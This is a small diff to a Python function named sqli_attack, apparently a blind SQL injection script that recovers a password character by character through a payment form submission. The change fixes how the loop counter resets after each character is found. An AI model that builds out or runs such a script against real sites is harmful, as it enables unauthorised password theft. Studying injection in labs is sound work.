@@ -33,7 +33,7 @@ def sqli_attack(username):
         print(strng)
         if (submit_pay_form(sess, strng, 0)):
             pw = pw + c
-            i = 0
+            i = -1
         i += 1
     
     pw = pw[0:len(pw)]
